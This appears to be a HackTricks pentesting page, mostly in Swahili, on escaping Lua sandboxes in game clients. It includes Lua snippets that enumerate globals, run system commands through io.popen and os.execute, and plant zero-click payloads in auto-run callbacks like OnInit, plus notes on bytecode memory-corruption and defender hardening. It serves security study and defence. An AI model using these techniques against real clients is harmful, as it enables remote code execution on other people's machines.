# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Ukurasa huu unakusanya mbinu za vitendo za kuorodhesha na kutoroka kutoka kwa Lua "sandboxes" zilizojengwa ndani ya applications (hasa game clients, plugins, au in-app scripting engines). Injini nyingi zinaonyesha mazingira ya Lua yaliyopunguzwa, lakini hutoa globals zenye nguvu ambazo zinaweza kufikiwa na kuruhusu utekelezaji wa amri bila vizuizi au hata native memory corruption wakati bytecode loaders zinapotolewa.

Mawazo muhimu:
- Tibu VM kama mazingira yasiyojulikana: orodhesha _G na ugundue ni primitives gani hatari zinaweza kufikiwa.
- Iwapo stdout/print zimezuiwa, tumia kwa ubaya chanel yoyote ya UI/IPC ndani ya VM kama output sink ili kuangalia matokeo.
- Kama io/os imefunuliwa, mara nyingi una utekelezaji wa amri moja kwa moja (io.popen, os.execute).
- Kama load/loadstring/loadfile zimetolewa, kuendesha crafted Lua bytecode kunaweza kuvunja usalama wa kumbukumbu katika baadhi ya matoleo (≤5.1 verifiers ni bypassable; 5.2 iliondoa verifier), hivyo kuwezesha advanced exploitation.

## Orodhesha sandboxed environment

- Toa mazingira ya global ili kuorodhesha tables/functions zinazoweza kufikiwa:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Ikiwa print() haipo, tumia tena in-VM channels. Mfano kutoka kwenye MMO housing script VM ambapo chat output inafanya kazi tu baada ya sound call; ifuatayo inaunda function ya output imara:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Boresha mtindo huu kwa lengo lako: kisanduku chochote cha maandishi, toast, logger, au UI callback kinachokubali strings kinaweza kutumika kama stdout kwa reconnaissance.

## Direct command execution if io/os is exposed

Ikiwa sandbox bado inafunua maktaba za kawaida io au os, kuna uwezekano una immediate command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
- Utekelezaji hufanyika ndani ya client process; tabaka nyingi za anti-cheat/antidebug zinazozuia external debuggers hazitazuia in-VM process creation.
- Pia angalia: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), na debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

Ikiwa host application inatuma scripts kwa clients na VM inaonyesha auto-run hooks (e.g., OnInit/OnLoad/OnEnter), weka payload yako hapo kwa drive-by compromise mara script inapo load:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Any equivalent callback (OnLoad, OnEnter, etc.) inapanua mbinu hii wakati scripts zinapotumwa na kutekelezwa kwenye client kwa otomatiki.

## Vipengele vya msingi hatari vya kutafutwa wakati wa recon

Wakati wa _G enumeration, angalia hasa kwa:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: tekeleza source au bytecode; inaunga mkono kupakia bytecode zisizo za kuaminika.
- package, package.loadlib, require: kupakia maktaba za dynamic na uso wa module.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, na hooks.
- LuaJIT-only: ffi.cdef, ffi.load kwa kuita native code moja kwa moja.

Mifano ya matumizi ya chini (ikiwa inafikiwa):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Upandishaji wa hiari: abusing Lua bytecode loaders

Wakati load/loadstring/loadfile zinapatikana lakini io/os zimezuiliwa, utekelezaji wa crafted Lua bytecode unaweza kusababisha ufichuzi wa memory na primitives za corruption. Mambo muhimu:
- Lua ≤ 5.1 ilikuja na bytecode verifier ambayo ina bypasses zinazoeleweka.
- Lua 5.2 iliondoa verifier kabisa (msimamo rasmi: applications zinapaswa kukataa precompiled chunks), ikipanua attack surface ikiwa bytecode loading haijazuiwa.
- Workflows kwa kawaida: leak pointers kupitia in-VM output, tengeneza bytecode kuunda type confusions (kwa mfano, kuhusiana na FORLOOP au opcodes nyingine), kisha pinda hadi arbitrary read/write au native code execution.

Njia hii ni engine/version-specific na inahitaji RE. Angalia references kwa uchambuzi wa kina, exploitation primitives, na mifano ya gadgetry katika games.

## Detection and hardening notes (for defenders)

- Server side: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: run Lua with a minimal _ENV, forbid bytecode loading, reintroduce a strict bytecode verifier or signature checks, and block process creation from the client process.
- Telemetry: alert on gameclient → child process creation shortly after script load; correlate with UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
